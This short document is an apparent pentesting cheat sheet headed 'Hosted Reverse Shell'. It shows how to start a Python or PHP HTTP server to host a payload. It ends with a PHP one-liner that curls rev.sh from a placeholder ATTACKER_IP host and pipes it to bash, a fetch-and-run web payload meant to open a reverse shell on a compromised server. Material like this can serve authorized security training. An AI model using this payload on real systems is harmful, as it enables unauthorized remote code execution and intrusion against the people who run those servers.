# Hosted Reverse Shell

## 1st step is always setting up an HTTP server

### 1) Python

    python3 -m http.server PORT

### 2) PHP

    php -S 0.0.0.0

## 2nd step is creating a payload, then hosting it on your HTTP server

## 3rd step is calling your hosted payload to run it

### 1) PHP

    <?php system("curl ATTACKER_IP:PORT/rev.sh|bash"); ?>
